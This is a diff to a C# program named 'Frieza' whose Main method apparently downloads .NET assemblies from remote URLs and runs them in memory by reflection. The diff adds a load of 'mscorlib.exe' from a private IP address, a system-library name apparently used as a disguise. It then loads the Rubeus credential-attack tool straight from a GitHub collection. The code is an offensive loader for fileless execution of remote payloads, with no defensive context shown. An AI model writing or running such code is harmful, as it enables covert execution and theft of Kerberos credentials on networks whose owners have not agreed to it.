@@ -1,8 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Net;
 using System.Reflection;
 using System.Threading;
@@ -40,7 +36,29 @@ namespace Frieza
         }
         static void Main(string[] args)
         {
-            ReflectFromWeb("http://192.168.64.138/HelloFromReflectionWorld.exe", 3, 5);
+            try
+            {
+                Console.WriteLine("Hit a key to start");
+                Console.ReadKey();
+                ReflectFromWeb("http://192.168.64.138/mscorlib.exe", 0, 0);
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Console.WriteLine("could not load mscorlib, exitting gracefully.");
+                Environment.Exit(-1);
+            }
+            try
+            {
+                ReflectFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe", 3, 5);
+                Console.ReadKey();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Console.ReadKey();
+            }
         }
     }
 }
